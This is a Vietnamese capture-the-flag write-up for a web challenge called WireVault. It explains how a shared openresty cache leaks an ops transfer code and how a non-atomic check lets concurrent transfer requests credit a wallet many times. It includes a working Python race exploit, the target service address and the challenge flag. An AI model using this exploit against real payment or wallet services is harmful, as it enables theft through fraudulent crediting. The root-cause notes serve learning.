---
title: "WireVault"
category: "Web"
tags: ["web", "express", "openresty", "cache-leak", "race-condition", "toctou", "wallet"]
solve_date: "2026-10-26T10:51:50+07:00"
language: "vi"
points: 71
---

# WireVault — làm lộ settlement code qua cache, sau đó khai thác race condition

**Flag:** `CTF{8bc0b47d16a341747a384edb8b88afb8}`  
**Service:** `http://144.217.91.111:3003`  
**Định dạng flag:** `CTF{...}`

## Đề bài

> WireVault — 71 điểm. WireVault là dịch vụ thanh toán/settlement nội bộ. Có một wallet dường như chỉ ops mới được phép nạp tiền.

Ứng dụng là ví Express có đăng ký, đăng nhập, số dư, cửa hàng vật phẩm và endpoint chuyển tiền. Vật phẩm mục tiêu là `platinum_pass` giá 50.000 cent. Chỉ role ops nội bộ mới lấy được settlement code để nạp tiền vào wallet.

## Phân tích

### Các endpoint

Ứng dụng Express cung cấp các JSON endpoint:

| Endpoint | Mục đích |
|---|---|
| `POST /api/auth/register` | Tạo tài khoản |
| `POST /api/auth/login` | Tạo session cookie (`connect.sid`) |
| `GET /api/wallet/balance` | Xem số dư hiện tại |
| `GET /api/wallet/items` | Xem danh mục cửa hàng |
| `POST /api/wallet/buy` | Mua vật phẩm |
| `POST /api/wallet/transfer` | Xác nhận transfer bằng ops `authCode` |
| `GET /api/admin/status` | Trạng thái ops nội bộ, bình thường trả 401 |

Một internal service thứ hai chạy phía sau cùng openresty instance. Ứng dụng public không cấp ops code cho user thông thường.

### Rò rỉ 1 — ops status bị cache

Với session thường, `GET /api/admin/status` trả `401 {"error":"unauthorized"}`. Tuy nhiên, openresty cache response ops thành công mà không đưa session vào cache key. Nếu poll liên tục, endpoint cuối cùng sẽ trả `200` đã cache cùng `X-Cache: HIT`:

```json
{"status":"ok","role":"ops","transferAuthCode":"6d30388cfbe78ca85e4b671dd9a34542","expiresInSeconds":300}
```

Code có hiệu lực 300 giây. Chỉ cần poll nền để phát hiện `transferAuthCode` mới rồi gửi ngay là đủ.

### Rò rỉ 2 — settlement có thể race

`POST /api/wallet/transfer` cần cả session cookie đã đăng nhập lẫn ops `authCode` hợp lệ. Với mỗi code trên mỗi account, nó cộng cố định **5.000 cent**, bất kể field `amount` có giá trị gì. Kiểm tra “đã settle chưa” là TOCTOU kinh điển:

1. Request A đọc trạng thái “code chưa được dùng cho account này”.
2. Request B cũng đọc trạng thái đó trước khi A ghi dấu đã dùng.
3. Cả hai cùng cộng 5.000.

Hai mươi request đồng thời dùng một code mới tạo ra 100.000 cent. Cùng code đó còn có thể race trên account khác cho tới khi hết hạn; code không bị giới hạn một lần dùng toàn cục.

## Khai thác

```python
import concurrent.futures as cf
import re
import requests
import time

BASE = "http://144.217.91.111:3003"
USER, PASS = "u183208552", "pass1234"

s = requests.Session()
s.post(BASE + "/api/auth/register", json={"username": USER, "password": PASS})
s.post(BASE + "/api/auth/login", json={"username": USER, "password": PASS})

# Wait for a fresh cached ops response and grab the settlement code.
code = None
while code is None:
    r = s.get(BASE + "/api/admin/status", headers={"Cache-Control": "no-cache"})
    if r.status_code == 200 and "transferAuthCode" in r.text:
        code = re.search(r'"transferAuthCode":"([a-f0-9]+)"', r.text).group(1)
    else:
        time.sleep(1)

# Race the one-time settlement check before the 300s TTL expires.
cookies = s.cookies.get_dict()

def settle(_):
    ss = requests.Session()
    ss.cookies.update(cookies)
    return ss.post(BASE + "/api/wallet/transfer", json={"authCode": code}).status_code

with cf.ThreadPoolExecutor(max_workers=20) as ex:
    list(ex.map(settle, range(20)))

print(s.get(BASE + "/api/wallet/balance").text)          # balance: 100000
print(s.post(BASE + "/api/wallet/buy", json={"item": "platinum_pass"}).text)
```

Response mua hàng chứa flag:

```json
{"status":"purchased","item":"platinum_pass","balance":50000,"flag":"CTF{8bc0b47d16a341747a384edb8b88afb8}"}
```

## Ghi chú

- Service bỏ qua các field `amount` và `to` trong transfer body; số tiền cộng vào luôn là 5.000 cho mỗi code trên mỗi account. Gửi `amount: 75000` cũng không thay đổi kết quả.
- Một code dùng được một lần trên mỗi account, nên tạo account mới rồi race là cách nhanh nhất để đạt 50.000.
- Root cause là sự kết hợp của hai lỗi độc lập: response chứa thông tin xác thực bị lộ qua shared cache, và phép kiểm tra “code đã dùng chưa” không atomic.
- Ops code có thời hạn 300 giây. Nếu lấy code gần cuối thời hạn thì nó có thể hết hạn trước lúc transfer; vì vậy exploit đợi code mới thay vì tái sử dụng giá trị đã thấy trước đó.

## Tham khảo

- Express session cookie và `connect.sid`
- Openresty proxy caching (`X-Cache: HIT`)
